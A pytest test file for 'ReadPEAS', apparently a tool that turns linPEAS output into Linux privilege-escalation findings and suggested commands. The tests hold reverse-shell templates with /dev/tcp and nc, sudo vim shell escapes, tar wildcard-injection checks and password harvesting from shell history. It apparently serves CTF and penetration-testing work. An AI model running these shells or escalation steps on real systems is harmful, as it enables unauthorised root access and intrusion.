"""Unit tests for all ReadPEAS Linux analysis modules."""

import os
import pytest

from modules.linux.sudo import analyze as sudo_analyze
from modules.linux.suid import analyze as suid_analyze
from modules.linux.capabilities import analyze as caps_analyze
from modules.linux.cron import analyze as cron_analyze
from modules.linux.writable_cron import analyze as writable_cron_analyze
from modules.linux.writable_passwd import analyze as passwd_analyze
from modules.linux.path_hijack import analyze as path_analyze
from modules.linux.groups import analyze as groups_analyze
from modules.linux.ld_preload import analyze as ldpreload_analyze
from modules.linux.nfs import analyze as nfs_analyze
from modules.linux.logrotate import analyze as logrotate_analyze
from modules.linux.credentials import analyze as creds_analyze
from modules.linux.wildcard_injection import analyze as wildcard_analyze


# ── sudo.py ───────────────────────────────────────────────────────────────────

class TestSudo:
    def test_nopasswd_is_critical(self):
        text = """
User ctf may run the following commands:
    (root) NOPASSWD: /usr/bin/vim
"""
        findings = sudo_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["type"] == "sudo"
        assert f["severity"] == "CRITICAL"
        assert f["nopasswd"] is True
        assert f["full_path"] == "/usr/bin/vim"
        assert len(f["commands"]) > 0

    def test_nopasswd_unknown_binary_still_critical(self):
        text = """
User ctf may run the following commands:
    (root) NOPASSWD: /usr/bin/notabin
"""
        findings = sudo_analyze(text)
        assert len(findings) == 1
        assert findings[0]["severity"] == "CRITICAL"
        assert findings[0]["nopasswd"] is True

    def test_password_required_with_gtfobins_is_high(self):
        text = """
User ctf may run the following commands:
    (root) /usr/bin/find
"""
        findings = sudo_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["type"] == "sudo"
        assert f["severity"] == "HIGH"
        assert f["nopasswd"] is False
        assert len(f["commands"]) > 0

    def test_password_required_unknown_binary_is_info(self):
        text = """
User ctf may run the following commands:
    (root) /usr/bin/notabin
"""
        findings = sudo_analyze(text)
        assert len(findings) == 1
        assert findings[0]["severity"] == "INFO"
        assert findings[0]["commands"] == []

    def test_sudo_user_flag_in_commands(self):
        text = """
User mat may run the following commands:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
"""
        findings = sudo_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["severity"] == "CRITICAL"
        # Commands should contain -u will flag
        assert any("-u will" in cmd for cmd in f["commands"])

    def test_normalize_python3_to_python(self):
        text = """
User ctf may run the following commands:
    (root) NOPASSWD: /usr/bin/python3
"""
        findings = sudo_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["severity"] == "CRITICAL"
        # python3 should resolve to python in GTFOBins
        assert len(f["commands"]) > 0

    def test_all_sudo_is_critical(self):
        text = """
User ctf may run the following commands:
    (ALL : ALL) NOPASSWD: ALL
"""
        findings = sudo_analyze(text)
        assert any(f["binary"] == "ALL" and f["severity"] == "CRITICAL" for f in findings)


# ── suid.py ───────────────────────────────────────────────────────────────────

class TestSuid:
    def test_known_binary_standard_path_is_critical(self):
        # find is in GTFOBins suid
        text = "-rwsr-xr-x 1 root root 166056 Jan 19 2024 /usr/bin/find\n"
        findings = suid_analyze(text)
        f = next((x for x in findings if x["full_path"] == "/usr/bin/find"), None)
        assert f is not None
        assert f["type"] == "suid"
        assert f["severity"] == "CRITICAL"
        assert len(f["commands"]) > 0

    def test_unknown_binary_standard_path_is_high(self):
        text = "-rwsr-xr-x 1 root root 22912 Mar 23 2022 /usr/bin/notabin\n"
        findings = suid_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["severity"] == "HIGH"
        assert "Unknown SUID" in f.get("note", "")
        assert len(f["commands"]) > 0

    def test_unknown_suid_menu_is_high(self):
        text = "-rwsr-xr-x 1 root root 18K Jan 2018 /usr/bin/menu\n"
        findings = suid_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["severity"] == "HIGH"
        assert "Unknown SUID" in f.get("note", "")

    def test_known_safe_binary_is_info(self):
        # su is in _KNOWN_SAFE → INFO even though it's not in GTFOBins
        text = "-rwsr-xr-x 1 root root 44K May 2017 /bin/su\n"
        findings = suid_analyze(text)
        assert len(findings) == 1
        assert findings[0]["severity"] == "INFO"

    def test_non_standard_path_is_critical(self):
        text = "-rwsr-xr-x 1 root root 22912 Mar 23 2022 /opt/custom_suid\n"
        findings = suid_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["severity"] == "CRITICAL"
        assert f.get("non_standard") is True
        assert len(f["commands"]) > 0

    def test_python_version_normalization(self):
        text = "-rwsr-xr-x 1 root root 44784 Jan 20 2024 /usr/bin/python3.8\n"
        findings = suid_analyze(text)
        f = next((x for x in findings if "python" in x["full_path"]), None)
        assert f is not None
        assert f["severity"] == "CRITICAL"
        assert len(f["commands"]) > 0


# ── capabilities.py ───────────────────────────────────────────────────────────

class TestCapabilities:
    def test_cap_setuid_is_critical_with_commands(self):
        text = "/usr/bin/python3.9 = cap_setuid+ep\n"
        findings = caps_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["type"] == "capabilities"
        assert f["severity"] == "CRITICAL"
        assert len(f["commands"]) > 0

    def test_cap_net_raw_is_high_without_gtfobins(self):
        # ping / cap_net_raw is exploitable but unlikely to have GTFOBins coverage
        text = "/usr/bin/ping = cap_net_raw+ep\n"
        findings = caps_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        # cap_net_raw is in _EXPLOITABLE_CAPS → at least HIGH
        assert f["severity"] in ("CRITICAL", "HIGH")

    def test_non_exploitable_cap_is_info(self):
        text = "/usr/bin/openssl = cap_net_bind_service+ep\n"
        findings = caps_analyze(text)
        assert len(findings) == 1
        assert findings[0]["severity"] == "INFO"

    @pytest.mark.parametrize("cap,expected_severity", [
        ("cap_setuid+ep",   "CRITICAL"),
        ("cap_setgid+ep",   "CRITICAL"),
        ("cap_sys_admin+ep","CRITICAL"),
    ])
    def test_always_critical_caps(self, cap, expected_severity):
        text = f"/usr/bin/testbin = {cap}\n"
        findings = caps_analyze(text)
        assert findings[0]["severity"] == expected_severity


# ── cron.py ───────────────────────────────────────────────────────────────────

class TestCron:
    def test_root_cron_is_high(self):
        text = "* * * * * root /opt/scripts/backup.sh\n"
        findings = cron_analyze(text)
        f = next((x for x in findings if x["script"] == "/opt/scripts/backup.sh"), None)
        assert f is not None
        assert f["type"] == "cron"
        assert f["severity"] == "HIGH"
        assert f["run_as"] == "root"
        assert len(f["commands"]) > 0

    def test_non_root_cron_is_medium(self):
        text = "*/5 * * * * www-data /var/scripts/cleanup.py\n"
        findings = cron_analyze(text)
        f = next((x for x in findings if x["script"] == "/var/scripts/cleanup.py"), None)
        assert f is not None
        assert f["severity"] == "MEDIUM"
        assert f["run_as"] == "www-data"

    def test_system_binary_not_reported(self):
        # /usr/bin/* should be skipped by find_writable_scripts
        text = "* * * * * root /usr/bin/find /tmp -delete\n"
        findings = cron_analyze(text)
        assert findings == []

    def test_duplicate_script_deduplicated(self):
        text = (
            "* * * * * root /opt/scripts/backup.sh\n"
            "*/10 * * * * root /opt/scripts/backup.sh\n"
        )
        findings = cron_analyze(text)
        scripts = [f["script"] for f in findings]
        assert scripts.count("/opt/scripts/backup.sh") == 1


# ── writable_cron.py ──────────────────────────────────────────────────────────

class TestWritableCron:
    def test_writable_root_cron_is_critical(self):
        text = (
            "* * * * * root /etc/scripts/clean_up.sh\n"
            "-rwxrwxr-x 1 root staff 512 Jan 1 /etc/scripts/clean_up.sh\n"
        )
        findings = writable_cron_analyze(text)
        f = next((x for x in findings if x["script"] == "/etc/scripts/clean_up.sh"), None)
        assert f is not None
        assert f["type"] == "writable_cron"
        assert f["severity"] == "CRITICAL"
        assert f["run_as"] == "root"
        assert len(f["commands"]) > 0

    def test_writable_non_root_cron_is_high(self):
        text = (
            "*/5 * * * * www-data /var/scripts/cleanup.py\n"
            "/var/scripts/cleanup.py\n"
        )
        findings = writable_cron_analyze(text)
        f = next((x for x in findings if x["script"] == "/var/scripts/cleanup.py"), None)
        assert f is not None
        assert f["severity"] == "HIGH"
        assert f["run_as"] == "www-data"

    def test_non_writable_permission_not_reported_as_direct(self):
        text = (
            "* * * * * root /usr/local/bin/main_backup.sh\n"
            "-rwxr-xr-x 1 root root 256 Dec 1 /usr/local/bin/main_backup.sh\n"
        )
        findings = writable_cron_analyze(text)
        # main_backup.sh is NOT group/other writable → should not appear as writable_cron
        direct = [f for f in findings if f["script"] == "/usr/local/bin/main_backup.sh"
                  and f.get("run_as") != "indirect"]
        assert direct == []

    def test_indirect_writable_executable_in_cron_path(self):
        text = (
            "* * * * * root /usr/local/bin/main_backup.sh\n"
            "-rwxrwxr-x 1 root staff 512 Jan 1 /usr/local/sbin/dev_backup.sh\n"
        )
        findings = writable_cron_analyze(text)
        indirect = next(
            (f for f in findings if f["script"] == "/usr/local/sbin/dev_backup.sh"),
            None,
        )
        assert indirect is not None
        assert indirect["severity"] == "HIGH"
        assert indirect["run_as"] == "indirect"
        assert indirect["schedule"] == "(cron PATH)"

    def test_bare_writable_path_matches_cron(self):
        text = (
            "* * * * * toby /home/toby/jobs/cow.sh\n"
            "/home/toby/jobs/cow.sh\n"
        )
        findings = writable_cron_analyze(text)
        f = next((x for x in findings if x["script"] == "/home/toby/jobs/cow.sh"), None)
        assert f is not None
        assert f["severity"] == "HIGH"  # toby, not root


# ── writable_passwd.py ────────────────────────────────────────────────────────

class TestWritablePasswd:
    def test_writable_passwd_is_critical(self):
        text = "-rw-rw-rw- 1 root root 1823 Jan 10 /etc/passwd\n"
        findings = passwd_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["type"] == "writable_file"
        assert f["severity"] == "CRITICAL"
        assert f["file"] == "/etc/passwd"
        assert len(f["commands"]) > 0

    def test_writable_shadow_is_critical(self):
        text = "[+] /etc/shadow is writable\n"
        findings = passwd_analyze(text)
        assert any(f["file"] == "/etc/shadow" and f["severity"] == "CRITICAL"
                   for f in findings)

    def test_readable_passwd_not_reported(self):
        text = "-rw-r--r-- 1 root root 1823 Jan 10 /etc/passwd\n"
        findings = passwd_analyze(text)
        assert findings == []


# ── path_hijack.py ────────────────────────────────────────────────────────────

class TestPathHijack:
    def test_writable_tmp_in_path_is_high(self):
        text = "Writable dir in PATH: /tmp\n"
        findings = path_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["type"] == "path_hijack"
        assert f["severity"] == "HIGH"
        assert f["writable_dir"] == "/tmp"
        assert len(f["commands"]) > 0

    def test_current_path_with_tmp_is_detected(self):
        text = "Current PATH: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/tmp\n"
        findings = path_analyze(text)
        assert any(f["writable_dir"] == "/tmp" for f in findings)

    def test_non_writable_path_not_reported(self):
        text = "Current PATH: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
        findings = path_analyze(text)
        assert findings == []


# ── groups.py ─────────────────────────────────────────────────────────────────

class TestGroups:
    def test_docker_group_is_critical(self):
        text = "uid=1000(user) gid=1000(user) groups=1000(user),998(docker)\n"
        findings = groups_analyze(text)
        f = next((x for x in findings if x["group"] == "docker"), None)
        assert f is not None
        assert f["type"] == "group"
        assert f["severity"] == "CRITICAL"
        assert len(f["commands"]) > 0

    def test_lxd_group_is_critical(self):
        text = "uid=1000(user) gid=1000(user) groups=1000(user),116(lxd)\n"
        findings = groups_analyze(text)
        f = next((x for x in findings if x["group"] == "lxd"), None)
        assert f is not None
        assert f["severity"] == "CRITICAL"

    @pytest.mark.parametrize("group,expected_severity", [
        ("docker", "CRITICAL"),
        ("lxd",    "CRITICAL"),
        ("disk",   "CRITICAL"),
        ("shadow", "CRITICAL"),
        ("adm",    "HIGH"),
        ("video",  "MEDIUM"),
    ])
    def test_group_severities(self, group, expected_severity):
        text = f"uid=1000(user) gid=1000(user) groups=1000(user),999({group})\n"
        findings = groups_analyze(text)
        f = next((x for x in findings if x["group"] == group), None)
        assert f is not None
        assert f["severity"] == expected_severity

    def test_unknown_group_not_reported(self):
        text = "uid=1000(user) gid=1000(user) groups=1000(user),42(somegroup)\n"
        findings = groups_analyze(text)
        assert findings == []


# ── ld_preload.py ─────────────────────────────────────────────────────────────

class TestLdPreload:
    def test_ld_preload_nopasswd_is_critical(self):
        text = """
Matching Defaults entries for ctf:
    env_reset, env_keep+=LD_PRELOAD

User ctf may run the following commands:
    (root) NOPASSWD: /usr/sbin/apache2
"""
        findings = ldpreload_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["type"] == "ld_preload"
        assert f["severity"] == "CRITICAL"
        assert f["env_var"] == "LD_PRELOAD"
        assert len(f["commands"]) > 0

    def test_ld_preload_password_required_is_high(self):
        text = """
Matching Defaults entries for ctf:
    env_reset, env_keep+=LD_PRELOAD

User ctf may run the following commands:
    (root) /usr/sbin/apache2
"""
        findings = ldpreload_analyze(text)
        assert len(findings) == 1
        assert findings[0]["severity"] == "HIGH"

    def test_ld_library_path_is_detected(self):
        text = """
Matching Defaults entries for ctf:
    env_reset, env_keep+=LD_LIBRARY_PATH

User ctf may run the following commands:
    (root) NOPASSWD: /usr/bin/find
"""
        findings = ldpreload_analyze(text)
        assert len(findings) == 1
        assert findings[0]["env_var"] == "LD_LIBRARY_PATH"
        assert findings[0]["severity"] == "CRITICAL"

    def test_no_env_keep_returns_empty(self):
        text = """
User ctf may run the following commands:
    (root) NOPASSWD: /usr/bin/vim
"""
        findings = ldpreload_analyze(text)
        assert findings == []

    def test_env_keep_without_sudo_cmd_returns_empty(self):
        text = "Matching Defaults entries: env_keep+=LD_PRELOAD\n"
        findings = ldpreload_analyze(text)
        assert findings == []


# ── nfs.py ────────────────────────────────────────────────────────────────────

class TestNfs:
    def test_no_root_squash_is_critical(self):
        text = "/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)\n"
        findings = nfs_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["type"] == "nfs"
        assert f["severity"] == "CRITICAL"
        assert f["export_path"] == "/tmp"
        assert len(f["commands"]) > 0

    def test_exports_prefix_stripped(self):
        text = "/etc/exports: /home/user *(rw,no_root_squash)\n"
        findings = nfs_analyze(text)
        assert len(findings) == 1
        assert findings[0]["export_path"] == "/home/user"

    def test_root_squash_not_reported(self):
        text = "/mnt/safe *(rw,root_squash)\n"
        findings = nfs_analyze(text)
        assert findings == []

    @pytest.mark.parametrize("line,expected_path", [
        ("/opt/share *(rw,sync,no_root_squash)", "/opt/share"),
        ("/etc/exports: /data *(rw,no_root_squash,no_subtree_check)", "/data"),
    ])
    def test_various_export_formats(self, line, expected_path):
        findings = nfs_analyze(line + "\n")
        assert len(findings) == 1
        assert findings[0]["export_path"] == expected_path


# ── logrotate.py ──────────────────────────────────────────────────────────────

class TestLogrotate:
    def test_writable_log_is_high(self):
        text = "/var/log/nginx/access.log\n"
        findings = logrotate_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["type"] == "logrotate"
        assert f["severity"] == "HIGH"
        assert f["log_path"] == "/var/log/nginx/access.log"
        assert len(f["commands"]) > 0

    def test_logrotten_section_header_skipped(self):
        # Lines that start with logrotate/default/compress tokens should be skipped
        text = (
            "logrotate 3.14.0\n"
            "Default compress command: /bin/gzip\n"
            "/var/log/apache2/access.log\n"
        )
        findings = logrotate_analyze(text)
        assert len(findings) == 1
        assert findings[0]["log_path"] == "/var/log/apache2/access.log"

    def test_multiple_log_files(self):
        text = (
            "/var/log/nginx/access.log\n"
            "/home/reader/backups/access.log\n"
        )
        findings = logrotate_analyze(text)
        assert len(findings) == 2
        paths = {f["log_path"] for f in findings}
        assert "/var/log/nginx/access.log" in paths
        assert "/home/reader/backups/access.log" in paths


# ── credentials.py ────────────────────────────────────────────────────────────

class TestCredentials:
    def test_mysql_cli_password_in_history(self):
        text = "/home/mat/.bash_history:mysql -u root -psecretpass\n"
        findings = creds_analyze(text)
        assert len(findings) >= 1
        f = next((x for x in findings if "secretpass" in x["password"]), None)
        assert f is not None
        assert f["type"] == "credential"
        assert f["severity"] == "HIGH"
        assert len(f["commands"]) > 0

    def test_generic_password_field(self):
        text = "password = hunter2_real\n"
        findings = creds_analyze(text)
        assert any(f["password"] == "hunter2_real" for f in findings)

    def test_placeholder_password_skipped(self):
        text = "password = changeme\n"
        findings = creds_analyze(text)
        assert findings == []

    def test_db_env_password(self):
        text = "DB_PASSWORD=supersecret99\n"
        findings = creds_analyze(text)
        assert any(f["password"] == "supersecret99" for f in findings)

    def test_comment_line_skipped(self):
        text = "# password = skipped_value\n"
        findings = creds_analyze(text)
        assert findings == []

    def test_dedup_same_password(self):
        text = (
            "password = uniquepass123\n"
            "DB_PASSWORD=uniquepass123\n"
        )
        findings = creds_analyze(text)
        passwords = [f["password"] for f in findings]
        assert passwords.count("uniquepass123") == 1

    def test_reuse_hint_in_commands(self):
        text = "password = hunter2_real\n"
        findings = creds_analyze(text)
        assert len(findings) >= 1
        cmds = findings[0]["commands"]
        # Must have reuse hint lines
        assert any("credential reuse" in c.lower() or "Try credential" in c for c in cmds)


# ── wildcard_injection.py ──────────────────────────────────────────────────────

class TestWildcardInjection:
    def test_tar_wildcard_in_script_content_is_high(self):
        text = (
            "Contents of /home/milesdyson/backups/backup.sh:\n"
            "#!/bin/bash\n"
            "cd /var/www/html && tar cf /home/milesdyson/backups/backup.tgz *\n"
        )
        findings = wildcard_analyze(text)
        assert len(findings) == 1
        f = findings[0]
        assert f["type"] == "wildcard_injection"
        assert f["severity"] == "HIGH"
        assert f["script"] == "/home/milesdyson/backups/backup.sh"
        assert f["working_dir"] == "/var/www/html"
        assert any("checkpoint=1" in c for c in f["commands"])

    def test_tar_wildcard_direct_line(self):
        text = "cd /tmp && tar czf /backup.tgz *\n"
        findings = wildcard_analyze(text)
        assert len(findings) >= 1
        assert findings[0]["severity"] == "HIGH"

    def test_no_tar_wildcard_returns_empty(self):
        text = "*/1 * * * * root /home/milesdyson/backups/backup.sh\n"
        findings = wildcard_analyze(text)
        assert findings == []

    def test_tar_without_wildcard_returns_empty(self):
        text = "tar czf /backup.tgz /var/www/html\n"
        findings = wildcard_analyze(text)
        assert findings == []

    def test_commands_include_checkpoint_and_rootbash(self):
        text = "cd /var/www && tar czf /tmp/backup.tgz *\n"
        findings = wildcard_analyze(text)
        assert len(findings) == 1
        cmds = findings[0]["commands"]
        assert any("checkpoint=1" in c for c in cmds)
        assert any("checkpoint-action" in c for c in cmds)
        assert any("rootbash" in c for c in cmds)


# ── ip/port injection (terminal.py) ───────────────────────────────────────────

class TestIpPortInjection:
    def test_lhost_lport_replaced(self):
        from output.terminal import _inject_ip_port
        cmd = "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
        assert _inject_ip_port(cmd, "10.10.10.10", 9001) == \
               "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"

    def test_no_ip_leaves_placeholders(self):
        from output.terminal import _inject_ip_port
        cmd = "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
        assert _inject_ip_port(cmd, None, 4444) == cmd

    def test_default_port_used_when_only_ip_given(self):
        from output.terminal import _inject_ip_port
        cmd = "nc LHOST LPORT"
        result = _inject_ip_port(cmd, "1.2.3.4", 4444)
        assert result == "nc 1.2.3.4 4444"

    def test_multiple_occurrences_replaced(self):
        from output.terminal import _inject_ip_port
        cmd = "echo LHOST:LPORT; connect LHOST LPORT"
        result = _inject_ip_port(cmd, "10.0.0.1", 1234)
        assert "LHOST" not in result
        assert "LPORT" not in result


# ── parser.py (sub-header stripping) ──────────────────────────────────────────

class TestParser:
    def test_sub_header_content_preserved(self):
        from core.parser import split_sections
        text = (
            "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Main Section\n"
            "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Sub Section\n"
            "Content below sub-header\n"
            "More content\n"
        )
        sections = split_sections(text)
        assert "Main Section" in sections
        content = sections["Main Section"]
        assert "Content below sub-header" in content
        assert "More content" in content
        # The sub-header line itself should be stripped
        assert "Sub Section" not in content

    def test_sub_header_line_stripped_not_content(self):
        from core.parser import split_sections
        text = (
            "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Sudo\n"
            "env_keep+=LD_PRELOAD\n"
            "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Details\n"
            "User may run: /usr/bin/vim\n"
        )
        sections = split_sections(text)
        assert "Sudo" in sections
        content = sections["Sudo"]
        assert "env_keep+=LD_PRELOAD" in content
        assert "User may run: /usr/bin/vim" in content
        assert "Details" not in content


# ── markdown export ────────────────────────────────────────────────────────────

class TestMarkdownExport:
    def test_markdown_creates_file_with_headings(self, tmp_path):
        from readpeas import _write_markdown
        result = {
            "os": "linux",
            "total": 2,
            "findings": [
                {
                    "type": "sudo",
                    "binary": "vim",
                    "full_path": "/usr/bin/vim",
                    "severity": "CRITICAL",
                    "nopasswd": True,
                    "commands": ["sudo /usr/bin/vim -c ':!/bin/sh'"],
                },
                {
                    "type": "capabilities",
                    "binary": "ping",
                    "full_path": "/usr/bin/ping",
                    "caps": "cap_net_raw+ep",
                    "severity": "HIGH",
                    "commands": [],
                },
            ],
        }
        old_cwd = os.getcwd()
        os.chdir(tmp_path)
        try:
            _write_markdown(result, "linpeas.txt")
        finally:
            os.chdir(old_cwd)

        md_file = tmp_path / "linpeas.md"
        assert md_file.exists()
        content = md_file.read_text(encoding="utf-8")
        assert "# ReadPEAS Report" in content
        assert "## CRITICAL" in content
        assert "## HIGH" in content
        assert "### sudo" in content
        assert "sudo /usr/bin/vim" in content

    def test_markdown_no_info_section_when_empty(self, tmp_path):
        from readpeas import _write_markdown
        result = {
            "os": "linux",
            "total": 1,
            "findings": [
                {
                    "type": "sudo",
                    "binary": "vim",
                    "full_path": "/usr/bin/vim",
                    "severity": "CRITICAL",
                    "nopasswd": True,
                    "commands": ["sudo vim -c ':!/bin/sh'"],
                },
            ],
        }
        old_cwd = os.getcwd()
        os.chdir(tmp_path)
        try:
            _write_markdown(result, "test.txt")
        finally:
            os.chdir(old_cwd)

        content = (tmp_path / "test.md").read_text(encoding="utf-8")
        assert "## INFO" not in content
